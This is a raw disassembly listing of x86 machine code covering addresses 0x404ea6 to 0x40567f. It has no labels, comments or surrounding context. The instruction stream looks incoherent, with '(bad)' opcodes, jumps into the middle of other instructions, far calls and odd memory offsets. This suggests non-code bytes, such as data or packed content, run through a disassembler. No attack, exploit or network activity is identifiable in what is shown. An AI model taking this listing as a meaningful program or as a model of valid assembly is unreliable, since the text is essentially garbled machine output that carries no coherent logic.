  404ea6:	add    bh,BYTE PTR [ecx+0x15ffa274]
  404eac:	pop    eax
  404ead:	add    DWORD PTR [ebx+0x0],0x410b09b5
  404eb4:	inc    eax
  404eb5:	mov    BYTE PTR [edx+0x10],cl
  404eb8:	sub    BYTE PTR [eax+0x20002414],ah
  404ebe:	inc    edx
  404ebf:	and    eax,0x4898005
  404ec4:	add    al,0x10
  404ec6:	and    BYTE PTR [esi+0x3],al
  404ec9:	and    al,0x70
  404ecb:	inc    ecx
  404ecc:	pusha  
  404ecd:	or     dh,BYTE PTR [eax]
  404ecf:	add    BYTE PTR [eax],ah
  404ed1:	add    BYTE PTR ds:0x40806a25,al
  404ed7:	sbb    BYTE PTR [eax],al
  404ed9:	push   ebp
  404eda:	aam    0x28
  404edc:	or     BYTE PTR [ebx+0xd12c6a2],0x70
  404ee3:	add    DWORD PTR [edx+0x11],edx
  404ee6:	or     BYTE PTR [eax],al
  404ee8:	adc    BYTE PTR [ecx+0x42b86029],0xc0
  404eef:	enter  0x85,0xb8
  404ef3:	and    BYTE PTR [ecx],ah
  404ef5:	cmp    DWORD PTR [eax-0x74bf4bfc],eax
  404efb:	or     BYTE PTR [edx],0x14
  404efe:	xor    BYTE PTR [ebp+0x45c0c10],al
  404f04:	mov    BYTE PTR [eax+eax*2],dl
  404f07:	or     bh,BYTE PTR [eax-0x7c]
  404f0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f0b:	xor    BYTE PTR [eax],cl
  404f0d:	xchg   ebx,eax
  404f0e:	or     BYTE PTR [eax+0x66],al
  404f11:	add    al,0x31
  404f13:	inc    ecx
  404f14:	add    BYTE PTR [eax],0x40
  404f17:	cmp    al,BYTE PTR [edi]
  404f19:	or     BYTE PTR [eax+0x6],al
  404f1c:	inc    ebx
  404f1d:	or     al,BYTE PTR [edx+eax*8]
  404f20:	add    DWORD PTR [eax+0x16],eax
  404f23:	fadd   DWORD PTR [eax]
  404f25:	or     al,BYTE PTR [eax]
  404f27:	xor    BYTE PTR [eax-0x76],dl
  404f2a:	sbb    BYTE PTR [edx],ch
  404f2c:	aaa    
  404f2d:	push   es
  404f2e:	or     BYTE PTR [ecx],dl
  404f30:	xchg   edi,eax
  404f31:	or     BYTE PTR [eax+0x32],dl
  404f34:	ds inc eax
  404f36:	or     al,BYTE PTR [eax+edx*1]
  404f39:	sub    eax,0x280003d0
  404f3e:	push   es
  404f3f:	and    BYTE PTR [eax+eax*2],al
  404f42:	mov    eax,ds:0x22006d0
  404f47:	add    DWORD PTR [edx+edi*1+0x19],ecx
  404f4b:	and    BYTE PTR [eax],al
  404f4d:	and    BYTE PTR [eax],al
  404f4f:	add    BYTE PTR [eax],0x1
  404f52:	add    al,al
  404f54:	add    BYTE PTR [eax],0x10
  404f57:	push   eax
  404f58:	inc    esp
  404f59:	dec    edx
  404f5a:	add    BYTE PTR [eax+0x21b0500a],cl
  404f60:	push   es
  404f61:	or     BYTE PTR [edx],cl
  404f63:	sbb    DWORD PTR [eax],0xb018822a
  404f69:	das    
  404f6a:	or     al,BYTE PTR [ebp+0x20]
  404f6d:	sub    BYTE PTR [esi+0x11800c38],al
  404f73:	adc    al,0xa
  404f75:	bound  eax,QWORD PTR [eax+0x40]
  404f78:	add    BYTE PTR [eax],ch
  404f7a:	xor    dl,BYTE PTR [eax]
  404f7c:	add    BYTE PTR [eax-0x2b],al
  404f7f:	xor    BYTE PTR [esi+0x40],ch
  404f82:	add    al,0x15
  404f84:	mov    WORD PTR [eax],es
  404f86:	add    eax,DWORD PTR [eax]
  404f88:	xchg   esp,eax
  404f89:	add    BYTE PTR [ecx+edx*4+0x10],ah
  404f8d:	add    DWORD PTR [eax],0x66
  404f90:	sbb    DWORD PTR [eax],esi
  404f92:	sub    BYTE PTR [eax],al
  404f94:	inc    esp
  404f95:	and    al,0xe
  404f97:	xchg   DWORD PTR gs:[eax],esi
  404f9a:	push   eax
  404f9b:	and    BYTE PTR [edx-0x40],al
  404f9e:	jo     0x404fd0
  404fa0:	or     DWORD PTR [eax+0x30],edx
  404fa3:	rol    DWORD PTR [eax],1
  404fa5:	sbb    DWORD PTR [edx],0x40
  404fa8:	add    DWORD PTR [eax-0x7befb340],eax
  404fae:	add    BYTE PTR [eax],al
  404fb0:	and    al,0xc4
  404fb2:	or     al,0x60
  404fb4:	and    BYTE PTR [eax],dl
  404fb6:	add    DWORD PTR [eax],0x800803f0
  404fbc:	inc    eax
  404fbd:	xor    eax,edx
  404fbf:	into   
  404fc0:	mov    esp,0xd561c400
  404fc5:	mov    al,0x67
  404fc7:	or     al,0x80
  404fc9:	mov    ds:0x500c400,al
  404fce:	bound  eax,QWORD PTR [ecx+esi*4]
  404fd1:	add    al,0x0
  404fd3:	inc    esi
  404fd4:	inc    esi
  404fd5:	pusha  
  404fd6:	or     al,BYTE PTR [eax-0x38b9ef70]
  404fdc:	add    BYTE PTR [eax],al
  404fde:	or     cl,cl
  404fe0:	and    BYTE PTR [eax-0x7a],dl
  404fe3:	add    al,0xa0
  404fe5:	adc    BYTE PTR [eax],ah
  404fe7:	and    BYTE PTR [eax-0x55beddfe],0x7c
  404fee:	add    eax,0x84086c08
  404ff3:	add    BYTE PTR [ecx],al
  404ff5:	adc    BYTE PTR [eax+edx*1],al
  404ff8:	add    BYTE PTR [eax],bl
  404ffa:	pusha  
  404ffb:	add    BYTE PTR [edx-0x3f5eca38],al
  405001:	inc    ecx
  405002:	add    dl,ch
  405004:	cmp    DWORD PTR [eax],esi
  405006:	test   BYTE PTR [eax-0x6dde3f19],ah
  40500c:	add    DWORD PTR [edx],ecx
  40500e:	ret    
  40500f:	cdq    
  405010:	pop    eax
  405011:	shl    dl,cl
  405013:	inc    edx
  405014:	or     DWORD PTR [ecx+0x60],eax
  405017:	add    edx,DWORD PTR [eax+0x1c220bb0]
  40501d:	push   edx
  40501e:	sub    BYTE PTR [eax-0x7f7ffff8],al
  405024:	add    al,0x0
  405026:	dec    edx
  405027:	in     al,dx
  405028:	add    al,0x2c
  40502a:	mov    dl,BYTE PTR [esi]
  40502c:	and    BYTE PTR [eax],dl
  40502e:	cwde   
  40502f:	add    ah,BYTE PTR [ebx]
  405031:	add    DWORD PTR [eax],ebx
  405033:	add    al,BYTE PTR [eax]
  405035:	adc    al,0x5
  405037:	and    BYTE PTR [ecx],al
  405039:	mov    al,ds:0x4140aa24
  40503e:	mov    al,0x0
  405040:	mov    al,ds:0x8304b005
  405045:	test   BYTE PTR [ecx],al
  405047:	mov    ah,0x10
  405049:	adc    BYTE PTR [ecx+0x0],0x50
  40504d:	test   BYTE PTR [eax+eax*4],al
  405050:	ret    0x89
  405053:	push   edi
  405054:	add    BYTE PTR [ebp+0x8862419],ah
  40505a:	push   esp
  40505b:	adc    BYTE PTR [eax],al
  40505d:	jmp    0x84451a2
  405062:	inc    esp
  405063:	mov    BYTE PTR [eax],al
  405065:	add    DWORD PTR [eax],ebx
  405067:	cmp    DWORD PTR [ecx+eax*1],esp
  40506a:	add    BYTE PTR [eax],cl
  40506c:	and    BYTE PTR [ebp+0x30],dl
  40506f:	add    al,0x4
  405071:	adc    eax,0x8a048390
  405076:	add    BYTE PTR [eax+0x7001606b],cl
  40507c:	add    eax,0x2b012356
  405081:	inc    eax
  405082:	and    al,al
  405084:	add    BYTE PTR [eax+0x24070014],al
  40508a:	adc    al,0x80
  40508c:	add    BYTE PTR [edx],ah
  40508e:	or     BYTE PTR [eax+0x8241184],dh
  405094:	fs inc eax
  405096:	push   cs
  405097:	push   cs
  405098:	xchg   ebx,eax
  405099:	and    bl,BYTE PTR [ecx]
  40509b:	adc    BYTE PTR [edx],dl
  40509d:	add    al,0x20
  40509f:	adc    DWORD PTR [edx+0x0],0x5
  4050a3:	adc    dh,BYTE PTR [ecx-0x50]
  4050a6:	or     BYTE PTR [ecx],ah
  4050a8:	inc    ecx
  4050a9:	push   eax
  4050aa:	and    BYTE PTR [eax+eax*4-0x80],ch
  4050ae:	mov    DWORD PTR [ecx],eax
  4050b0:	xor    DWORD PTR [eax+0x4c],edx
  4050b3:	mov    DWORD PTR [ebp+0x13011005],eax
  4050b9:	adc    BYTE PTR [ecx],al
  4050bb:	and    ah,BYTE PTR [edx+ecx*8]
  4050be:	cmp    eax,DWORD PTR [ecx]
  4050c0:	adc    BYTE PTR [eax],ch
  4050c2:	xor    DWORD PTR ss:[eax],eax
  4050c5:	inc    ebx
  4050c6:	xor    al,0x80
  4050c8:	or     al,0xcc
  4050ca:	xchg   ecx,eax
  4050cb:	jecxz  0x405053
  4050cd:	add    eax,0x25a40108
  4050d2:	inc    eax
  4050d3:	call   0x84412ae4
  4050d8:	test   al,0x80
  4050da:	sub    BYTE PTR cs:[eax+eax*2],al
  4050de:	mov    esi,0x4080231
  4050e3:	or     BYTE PTR [eax],0xa0
  4050e6:	inc    eax
  4050e7:	push   0x12302a06
  4050ec:	dec    eax
  4050ed:	pusha  
  4050ee:	sub    cl,BYTE PTR [ecx]
  4050f0:	add    BYTE PTR [esi-0x2eb3a7fe],0x25
  4050f7:	add    BYTE PTR ds:0x67212e6,ch
  4050fd:	rol    BYTE PTR [edx+0x40040],0x88
  405104:	inc    eax
  405105:	or     al,0x5
  405107:	les    esp,FWORD PTR [eax]
  405109:	mov    BYTE PTR [eax+0x2500a549],ah
  40510f:	test   al,0x80
  405111:	shl    BYTE PTR ds:0x10226081,0x40
  405118:	test   BYTE PTR [ecx],al
  40511a:	add    al,0x4d
  40511c:	or     BYTE PTR [eax+0x12c0002],dl
  405122:	rcl    DWORD PTR [esp+ebx*4],0x0
  405126:	add    BYTE PTR [eax],al
  405128:	les    ebx,FWORD PTR [eax+0x49448568]
  40512e:	mov    BYTE PTR [eax],al
  405130:	add    BYTE PTR [esi+0x2528c002],cl
  405136:	test   BYTE PTR [edx+0x45],cl
  405139:	xor    dh,BYTE PTR [eax]
  40513b:	xor    edx,DWORD PTR [edx]
  40513d:	das    
  40513e:	or     DWORD PTR [ebp-0x37b7cff8],0x8001821
  405148:	les    edx,FWORD PTR [ebx+ecx*1]
  40514b:	mov    WORD PTR [ebx+0x16],fs
  40514e:	xor    BYTE PTR [edx],bh
  405150:	push   eax
  405151:	sub    BYTE PTR [eax],al
  405153:	add    BYTE PTR [eax],ch
  405155:	or     BYTE PTR [edx],al
  405157:	adc    BYTE PTR [eax],al
  405159:	lahf   
  40515a:	xor    al,0x0
  40515c:	add    ah,BYTE PTR [esi+eax*1]
  40515f:	mov    al,ds:0x107c1100
  405164:	or     BYTE PTR [eax],al
  405166:	adc    BYTE PTR [ecx+0x0],al
  405169:	or     al,0x6
  40516b:	les    ecx,FWORD PTR [edx]
  40516d:	add    BYTE PTR [eax],al
  40516f:	push   es
  405170:	add    ebx,DWORD PTR [eax]
  405172:	or     eax,DWORD PTR [eax-0x73b4587b]
  405178:	mov    DWORD PTR [ecx+eiz*1+0x58300600],ebp
  40517f:	and    DWORD PTR [ecx],0x44
  405182:	and    BYTE PTR [edx+0x1a],0x21
  405186:	lds    ebx,FWORD PTR [ecx+0x0]
  405189:	or     BYTE PTR [ecx+esi*1-0x1eed3bf9],ch
  405190:	test   BYTE PTR [ecx],al
  405192:	push   es
  405193:	push   esi
  405194:	loope  0x4051a8
  405196:	inc    eax
  405197:	je     0x40519d
  405199:	add    DWORD PTR [eax],esp
  40519b:	and    BYTE PTR [edx],al
  40519d:	rol    BYTE PTR [edx],0x7
  4051a0:	adc    BYTE PTR [eax-0x58],al
  4051a3:	xor    BYTE PTR [edi],0x2
  4051a6:	pusha  
  4051a7:	add    al,BYTE PTR [edx]
  4051a9:	push   eax
  4051aa:	add    eax,0x44580e72
  4051af:	inc    ebp
  4051b0:	add    BYTE PTR [esi+0x2c4005c4],ah
  4051b6:	add    BYTE PTR [ecx],al
  4051b8:	or     al,0xe1
  4051ba:	sub    BYTE PTR [eax],ah
  4051bc:	adc    al,0x8
  4051be:	fisub  DWORD PTR [eax]
  4051c0:	add    BYTE PTR [eax+0xa482522],cl
  4051c6:	inc    eax
  4051c7:	add    BYTE PTR [ecx],al
  4051c9:	dec    ecx
  4051ca:	add    DWORD PTR [ebx+0x2e010000],edx
  4051d0:	inc    ecx
  4051d1:	nop
  4051d2:	push   ebx
  4051d3:	pop    eax
  4051d4:	imul   edx,DWORD PTR [eax],0x2a000945
  4051da:	adc    BYTE PTR [eax],ch
  4051dc:	sahf   
  4051dd:	xor    al,0x20
  4051df:	les    esi,FWORD PTR [ecx]
  4051e1:	or     BYTE PTR [ecx+0x62],al
  4051e4:	or     al,BYTE PTR [eax+0x12]
  4051e7:	push   edx
  4051e8:	adc    BYTE PTR [edx],cl
  4051ea:	pusha  
  4051eb:	add    BYTE PTR [eax-0x7f7ffffc],ch
  4051f1:	pop    eax
  4051f2:	add    dl,BYTE PTR [esi-0x7e]
  4051f5:	inc    eax
  4051f6:	test   BYTE PTR [eax],al
  4051f8:	push   es
  4051f9:	adc    al,0xc8
  4051fb:	mov    BYTE PTR [ecx],ah
  4051fd:	add    dl,ah
  4051ff:	sub    BYTE PTR [eax],ah
  405201:	cmp    DWORD PTR [eax],edx
  405203:	dec    ebp
  405204:	bound  ecx,QWORD PTR [eax+ebp*1]
  405207:	add    BYTE PTR [ebp-0x7f92eeed],al
  40520d:	ins    BYTE PTR es:[edi],dx
  40520e:	add    eax,ecx
  405210:	ins    BYTE PTR es:[edi],dx
  405211:	mov    al,ds:0x91088208
  405216:	inc    eax
  405217:	adc    DWORD PTR [esp+edi*1],ebx
  40521a:	add    al,0x29
  40521c:	push   eax
  40521d:	add    BYTE PTR [ecx],cl
  40521f:	loopne 0x405229
  405221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405222:	adc    al,0x42
  405224:	or     DWORD PTR [eax],eax
  405226:	add    al,al
  405228:	add    DWORD PTR [eax+eax*1+0x10008058],esp
  40522f:	and    BYTE PTR ds:0x9309e609,ah
  405235:	or     al,BYTE PTR [ebp-0x37cbfa7f]
  40523b:	or     BYTE PTR [eax+0x50],al
  40523e:	push   ss
  40523f:	add    eax,0x80444000
  405244:	mov    dh,0x10
  405246:	add    al,0xa6
  405248:	add    BYTE PTR [edx+eax*1],dh
  40524b:	adc    BYTE PTR [eax+edx*2-0x7eaffdf8],al
  405252:	and    BYTE PTR [eax+ecx*1+0x30],al
  405256:	or     BYTE PTR [eax+0x1560c008],cl
  40525c:	adc    eax,DWORD PTR [esi]
  40525e:	mov    al,ds:0x84834016
  405263:	adc    BYTE PTR [ebx+0x710180b],ah
  405269:	and    cl,0x0
  40526c:	add    BYTE PTR [eax],al
  40526e:	sub    BYTE PTR [esi],ch
  405270:	add    BYTE PTR [eax-0x7ff9fff0],al
  405276:	add    cl,ch
  405278:	or     BYTE PTR [eax+0x6],ah
  40527b:	add    al,0x18
  40527e:	cmp    al,0x68
  405280:	mov    eax,ds:0x460308
  405285:	add    BYTE PTR [eax+eax*1],al
  405288:	add    BYTE PTR [ecx+0x0],cl
  40528b:	cmp    al,0x43
  40528d:	mov    edx,esi
  40528f:	and    BYTE PTR [eax],al
  405291:	rcl    BYTE PTR [eax+0x49822002],1
  405297:	add    BYTE PTR [edx-0x70],ah
  40529a:	dec    esi
  40529b:	ret    0xc210
  40529e:	call   0x2c505b08
  4052a3:	enter  0x4831,0x8
  4052a7:	add    BYTE PTR ds:0x6860c01b,dh
  4052ad:	add    BYTE PTR [eax-0x7dbedf7a],0x68
  4052b4:	adc    BYTE PTR [esi-0x3c],al
  4052b7:	pushaw 
  4052b9:	add    eax,0x20480701
  4052be:	test   BYTE PTR [eax+ecx*1-0x75db5ef7],ch
  4052c5:	nop
  4052c6:	mov    DWORD PTR [ecx+edx*2+0x820a96],edx
  4052cd:	or     BYTE PTR [eax],ch
  4052cf:	add    BYTE PTR [ecx],al
  4052d1:	adc    BYTE PTR [eax],al
  4052d3:	adc    BYTE PTR [eax],0xc
  4052d6:	add    al,0x15
  4052d8:	add    al,BYTE PTR [eax]
  4052da:	test   BYTE PTR [eax],ah
  4052dc:	or     al,0x10
  4052de:	inc    esi
  4052df:	inc    edx
  4052e0:	adc    al,0x1
  4052e2:	or     al,0x80
  4052e4:	adc    eax,0x8092176
  4052e9:	inc    edx
  4052ea:	and    BYTE PTR [ecx+0x420448c8],al
  4052f0:	or     BYTE PTR [eax+0x4],0x92
  4052f4:	add    al,0xa4
  4052f6:	sub    eax,0x8a8400
  4052fb:	mov    DWORD PTR [eax],ecx
  4052fd:	xchg   BYTE PTR [eax],dh
  4052ff:	add    eax,0xa88103e0
  405304:	dec    eax
  405305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405306:	add    BYTE PTR [edx],cl
  405308:	add    BYTE PTR [eax],al
  40530a:	add    dl,BYTE PTR [ecx]
  40530c:	or     BYTE PTR [eax-0x7ff7f780],ah
  405312:	add    BYTE PTR [eax+0x2d000420],bl
  405318:	pop    es
  405319:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40531a:	add    BYTE PTR [esi-0x6bfffca8],ch
  405320:	pop    ecx
  405321:	dec    eax
  405322:	or     BYTE PTR [esi],dl
  405324:	adc    DWORD PTR [eax],eax
  405326:	adc    BYTE PTR [ecx+0x21040440],dl
  40532c:	push   ecx
  40532d:	add    DWORD PTR [ebx],ebx
  40532f:	xchg   edx,eax
  405330:	add    al,BYTE PTR [eax+0x33129509]
  405336:	and    eax,0xc6000201
  40533b:	adc    al,0x6
  40533d:	add    BYTE PTR [eax-0x37f269f9],al
  405343:	add    BYTE PTR [esp+eax*4],ah
  405346:	xor    BYTE PTR [eax+0x5267],0x81
  40534d:	add    cl,cl
  40534f:	add    BYTE PTR [esp],al
  405352:	or     BYTE PTR [eax],dl
  405354:	(bad)  
  405355:	adc    BYTE PTR [ebx+0x41446112],al
  40535b:	sub    BYTE PTR [esi],0x4
  40535e:	inc    ebp
  40535f:	add    al,0xc1
  405361:	adc    BYTE PTR [eax+0x41008220],cl
  405367:	xor    BYTE PTR [ecx],ah
  405369:	mov    eax,ds:0x18808922
  40536e:	pop    ss
  40536f:	add    bl,BYTE PTR [ebp-0x7e]
  405372:	add    ecx,DWORD PTR [eax+0x10120400]
  405378:	or     DWORD PTR [ebx+edx*1-0x6d],eax
  40537c:	add    BYTE PTR [edx],dl
  40537e:	test   BYTE PTR [eax+eax*1],ah
  405381:	pushf  
  405382:	mov    ds:0x800f08c1,al
  405387:	adc    BYTE PTR [eax],0x70
  40538a:	or     dh,al
  40538c:	add    BYTE PTR [esp],ah
  40538f:	call   0x708:0x4c40704c
  405396:	add    al,0x98
  405398:	push   edx
  405399:	inc    eax
  40539a:	mov    DWORD PTR [edx],0xe2c30021
  4053a0:	and    al,BYTE PTR [ecx+0x66]
  4053a3:	test   al,0x10
  4053a5:	adc    al,0x94
  4053a7:	and    al,ah
  4053a9:	adc    DWORD PTR [ecx],eax
  4053ab:	push   ebp
  4053ac:	sub    BYTE PTR [ebx],0x10
  4053af:	add    al,BYTE PTR [esp+eax*8]
  4053b2:	inc    eax
  4053b3:	adc    ah,BYTE PTR [esi-0x40]
  4053b6:	and    BYTE PTR [eax],dl
  4053b8:	sub    BYTE PTR [eax+0x31050c0],dl
  4053be:	adc    BYTE PTR [eax],al
  4053c0:	inc    eax
  4053c1:	in     al,0x1
  4053c3:	mov    WORD PTR [eax],es
  4053c5:	xor    BYTE PTR [ecx-0x47ff7f5b],bh
  4053cb:	nop
  4053cc:	test   al,0xa0
  4053ce:	adc    cl,cl
  4053d0:	add    BYTE PTR [eax+0x3522040],cl
  4053d6:	sub    BYTE PTR [eax],al
  4053d8:	and    BYTE PTR [eax],cl
  4053da:	inc    edx
  4053db:	adc    al,al
  4053dd:	add    BYTE PTR [edx+0x0],bh
  4053e0:	xchg   esp,eax
  4053e1:	inc    eax
  4053e2:	add    BYTE PTR [ebx],ah
  4053e4:	xor    BYTE PTR [edx+0x10604394],al
  4053ea:	dec    esp
  4053eb:	inc    eax
  4053ec:	jae    0x405444
  4053ee:	and    eax,DWORD PTR [eax]
  4053f0:	add    esp,DWORD PTR [eax+0x0]
  4053f3:	add    DWORD PTR [eax],eax
  4053f5:	add    BYTE PTR [eax],ch
  4053f7:	add    esp,DWORD PTR [eax+eax*2+0x50100603]
  4053fe:	add    DWORD PTR [eax],esp
  405400:	loop   0x405403
  405402:	adc    al,BYTE PTR [ecx]
  405404:	pusha  
  405405:	xor    BYTE PTR [eax],0x0
  405408:	add    al,0x5
  40540a:	push   ds
  40540b:	adc    BYTE PTR [eax],cl
  40540d:	inc    edx
  40540e:	inc    eax
  40540f:	or     BYTE PTR [edx+0x35],cl
  405412:	ret    
  405413:	stc    
  405414:	js     0x405396
  405416:	xchg   ecx,eax
  405417:	mov    DWORD PTR [eax-0x80],esp
  40541a:	xchg   esi,eax
  40541b:	loopne 0x40543d
  40541d:	add    al,0x20
  40541f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405420:	or     edx,DWORD PTR [eax+0x6000380]
  405426:	inc    eax
  405427:	cmp    BYTE PTR [eax-0x80],al
  40542a:	inc    eax
  40542b:	inc    eax
  40542c:	or     BYTE PTR [eax],al
  40542e:	lea    edx,[ebx+edx*1+0x208a2721]
  405435:	or     BYTE PTR [eax+eax*1],al
  405438:	mov    eax,ds:0x37881408
  40543d:	or     DWORD PTR [eax],0x10c41000
  405443:	add    al,BYTE PTR [esi]
  405445:	inc    eax
  405446:	inc    esp
  405447:	add    DWORD PTR [eax],eax
  405449:	and    BYTE PTR [eax+0x4],al
  40544c:	add    BYTE PTR [ebx],ah
  40544e:	nop
  40544f:	mov    eax,ds:0x280aa044
  405454:	add    al,0x91
  405456:	adc    al,0xb2
  405458:	adc    BYTE PTR [edx],cl
  40545a:	add    eax,0x1308b204
  40545f:	dec    eax
  405460:	and    esi,DWORD PTR [ebx]
  405462:	gs cmp eax,0xa2104188
  405468:	add    BYTE PTR [edx],bl
  40546a:	adc    BYTE PTR [edx],ch
  40546c:	add    eax,0x50820
  405471:	arpl   WORD PTR [edx],ax
  405473:	adc    BYTE PTR [eax],al
  405475:	add    DWORD PTR [ebx],0x4ee10
  40547b:	push   edx
  40547c:	mov    BYTE PTR [esi],0x80
  40547f:	sbb    edx,DWORD PTR [eax+ecx*8]
  405482:	mov    al,0x26
  405484:	inc    esp
  405485:	or     al,0x40
  405487:	test   BYTE PTR [ecx-0x13],cl
  40548a:	or     cl,BYTE PTR [edx]
  40548c:	push   eax
  40548d:	mov    al,ds:0x204a5351
  405492:	add    BYTE PTR [eax-0x6cfdcfeb],dl
  405498:	add    BYTE PTR [eax+ecx*8+0x50],al
  40549c:	push   ds
  40549d:	add    BYTE PTR [eax+0x91d2042],ch
  4054a3:	or     eax,0x2011e36
  4054a8:	add    DWORD PTR [eax],eax
  4054aa:	and    BYTE PTR [ecx+0x50],al
  4054ad:	and    BYTE PTR ds:0x40040800,ah
  4054b3:	add    BYTE PTR [ebx+0x38],0x34
  4054b7:	add    BYTE PTR [eax],ah
  4054b9:	inc    esi
  4054ba:	nop
  4054bb:	in     al,dx
  4054bc:	add    BYTE PTR ds:0x2026d808,al
  4054c2:	mov    esp,db7
  4054c5:	add    BYTE PTR [eax+0x25102630],0xa1
  4054cc:	or     ch,BYTE PTR [esi]
  4054ce:	adc    BYTE PTR [esi],al
  4054d0:	cmp    al,ah
  4054d2:	adc    BYTE PTR [eax+0x20],al
  4054d5:	or     BYTE PTR [edx],ah
  4054d7:	push   eax
  4054d8:	les    eax,FWORD PTR [ecx-0x737bebff]
  4054de:	or     DWORD PTR [eax+0x51560],ebp
  4054e4:	and    al,BYTE PTR [edx+0x41080e88]
  4054ea:	inc    edx
  4054eb:	dec    esi
  4054ec:	add    BYTE PTR [edx+eax*8],al
  4054ef:	dec    esp
  4054f0:	add    ch,BYTE PTR [eax]
  4054f2:	and    al,0xaa
  4054f4:	sub    al,0x20
  4054f6:	sub    DWORD PTR [eax*1-0x6fef5fec],ebx
  4054fd:	dec    esp
  4054fe:	es or  eax,0x4c50000
  405504:	add    DWORD PTR [eax+0x18542808],eax
  40550a:	push   0x982440b2
  40550f:	adc    al,0x4
  405511:	test   BYTE PTR [edx],al
  405513:	jo     0x40555b
  405515:	bound  eax,QWORD PTR [ecx]
  405517:	sbb    DWORD PTR [ecx-0x60],esp
  40551a:	add    eax,0x0
  40551d:	xor    al,0x1a
  40551f:	or     BYTE PTR [eax],cl
  405521:	cmp    eax,0x3969400
  405526:	xchg   edx,eax
  405527:	mov    BYTE PTR [edi+0x22],dl
  40552a:	dec    eax
  40552b:	mov    ah,0x1c
  40552d:	add    al,0x10
  40552f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405530:	push   eax
  405531:	test   DWORD PTR [eax+0x404a92],eax
  405537:	xchg   edx,eax
  405538:	inc    eax
  405539:	adc    al,BYTE PTR [edx+eax*1]
  40553c:	mov    al,ds:0x1c87c1c0
  405541:	jo     0x40551b
  405543:	cld    
  405544:	sub    DWORD PTR [eax],ebp
  405546:	fldenv [edx+0x0]
  405549:	add    BYTE PTR [edx],dl
  40554b:	add    al,0x30
  40554d:	mov    cl,0x0
  40554f:	inc    ecx
  405550:	pusha  
  405551:	add    DWORD PTR [edi+0x46],edx
  405554:	add    BYTE PTR [eax+0x11042400],ah
  40555a:	adc    BYTE PTR [eax],al
  40555c:	xor    BYTE PTR [ecx],al
  40555e:	and    BYTE PTR [eax+eax*2+0x8],dl
  405562:	xchg   ebp,eax
  405563:	add    al,0x50
  405565:	inc    eax
  405566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405567:	push   ss
  405568:	mov    esi,0x21662801
  40556d:	inc    ebp
  40556e:	sub    BYTE PTR [eax-0x14],ah
  405571:	sbb    BYTE PTR fs:[eax],cl
  405574:	or     BYTE PTR ds:0x2b384048,ah
  40557a:	and    BYTE PTR [eax],0x70
  40557d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40557e:	xchg   ecx,eax
  40557f:	arpl   WORD PTR [ecx],dx
  405581:	pop    esp
  405582:	add    DWORD PTR [esp+eax*4],eax
  405585:	add    al,BYTE PTR [ecx]
  405587:	adc    BYTE PTR [eax],dl
  405589:	or     BYTE PTR [edx+0x290041b0],cl
  40558f:	xor    BYTE PTR [eax],bl
  405591:	add    cl,BYTE PTR [edx]
  405593:	add    BYTE PTR ds:0x48270040,cl
  405599:	adc    BYTE PTR [esi+ecx*4],al
  40559c:	shl    DWORD PTR [eax*2+0xd840811],1
  4055a3:	add    BYTE PTR [edx],bl
  4055a5:	add    DWORD PTR [eax],esp
  4055a7:	add    DWORD PTR [eax+0x5],edi
  4055aa:	mov    es,WORD PTR [ecx+0x38a584a2]
  4055b0:	(bad)  
  4055b1:	shl    DWORD PTR [eax+0x21020],0x19
  4055b8:	nop
  4055b9:	sbb    al,0xa0
  4055bb:	xchg   ecx,eax
  4055bc:	cmp    BYTE PTR [eax+eiz*4],0x1b
  4055c0:	imul   edx,DWORD PTR [eax],0x40461210
  4055c6:	push   es
  4055c7:	pusha  
  4055c8:	mov    al,ds:0x9a009ac
  4055cd:	and    BYTE PTR [eax+eiz*2+0x80018d9],0xc0
  4055d5:	test   BYTE PTR [eax],al
  4055d7:	or     BYTE PTR [eax+0x14248432],dh
  4055dd:	adc    BYTE PTR [ecx],al
  4055df:	xchg   ebx,eax
  4055e0:	push   eax
  4055e1:	nop
  4055e2:	add    cl,BYTE PTR [esp+eiz*4]
  4055e5:	fs inc eax
  4055e7:	or     edx,DWORD PTR [eax]
  4055e9:	pop    esp
  4055ea:	pusha  
  4055eb:	adc    edi,DWORD PTR [ebp+0x4809402]
  4055f1:	add    BYTE PTR [edx],dl
  4055f3:	inc    eax
  4055f4:	nop
  4055f5:	add    BYTE PTR [ecx+0x25],al
  4055f8:	dec    ecx
  4055f9:	or     eax,0xaa138921
  4055fe:	or     BYTE PTR [eax],al
  405600:	nop
  405601:	jns    0x4055a4
  405603:	mov    BYTE PTR [eax-0x7b73ff6e],ah
  405609:	pusha  
  40560a:	xor    BYTE PTR [ecx],cl
  40560c:	or     BYTE PTR [eax],0x1d
  40560f:	push   ebx
  405610:	adc    BYTE PTR [edi],al
  405612:	add    al,al
  405614:	inc    ebx
  405615:	add    cl,BYTE PTR [edx+0x58]
  405618:	and    BYTE PTR [eax+0x10],dl
  40561b:	or     al,al
  40561d:	adc    al,0x80
  40561f:	add    BYTE PTR [ecx],al
  405621:	or     BYTE PTR [eax],ah
  405623:	add    al,BYTE PTR [eax-0x5c]
  405626:	or     al,0x40
  405628:	sub    al,0x28
  40562a:	or     DWORD PTR [edx+0x48082201],ebx
  405630:	xor    BYTE PTR [ecx],al
  405632:	test   al,0x0
  405634:	add    al,0x0
  405636:	mov    eax,ds:0x30001807
  40563b:	sbb    BYTE PTR [ecx],al
  40563d:	inc    edx
  40563e:	add    DWORD PTR [eax],edx
  405640:	and    al,0x44
  405642:	mov    WORD PTR [eax-0x7ffff580],cs
  405648:	cwde   
  405649:	add    BYTE PTR [eax+eax*1+0x221045],al
  405650:	add    eax,0x1074400
  405655:	xor    BYTE PTR [eax],cl
  405657:	mov    al,0x8
  405659:	bound  ebx,QWORD PTR [eax]
  40565b:	or     BYTE PTR [eax],ah
  40565d:	inc    edx
  40565e:	mov    al,ds:0x169600a0
  405663:	add    DWORD PTR [eax],esi
  405665:	add    BYTE PTR [eax],bl
  405667:	or     BYTE PTR [eax],dh
  405669:	add    al,0x89
  40566b:	add    BYTE PTR ds:0x14040880,dl
  405671:	push   eax
  405672:	mov    al,ds:0x4000482
  405677:	inc    eax
  405678:	add    BYTE PTR [eax+eiz*4],ah
  40567b:	retf   0x8101
  40567e:	dec    esp
  40567f:	add    bh,bh
